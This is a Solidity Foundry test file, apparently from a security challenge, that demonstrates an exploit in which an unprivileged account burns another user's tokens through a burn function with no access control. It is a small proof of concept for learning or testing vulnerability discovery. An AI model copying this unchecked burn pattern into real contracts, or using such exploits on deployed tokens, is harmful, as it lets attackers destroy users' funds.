// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Challenge03.sol";

contract Challenge03Test is Test {
    Challenge03 token;
    address alice;
    address eve;

    function setUp() public {
        token = new Challenge03();
        alice = vm.addr(1);
        eve = vm.addr(2);

        // Mint 1000 tokens to Alice
        vm.prank(address(this)); // owner is deployer
        token.transfer(alice, 1000 ether);
    }

    function testExploitBurnArbitraryAccount() public {
        // Confirm Alice's balance before attack
        uint256 initialAliceBalance = token.balanceOf(alice);
        assertEq(initialAliceBalance, 1000 ether);

        // Eve maliciously burns Alice's tokens
        vm.prank(eve);
        token.burn(alice, 500 ether);

        // Alice's balance should now be reduced
        uint256 finalAliceBalance = token.balanceOf(alice);
        assertEq(finalAliceBalance, 500 ether);

        // Confirm that the burn was unauthorized
        assertLt(finalAliceBalance, initialAliceBalance);
    }
}
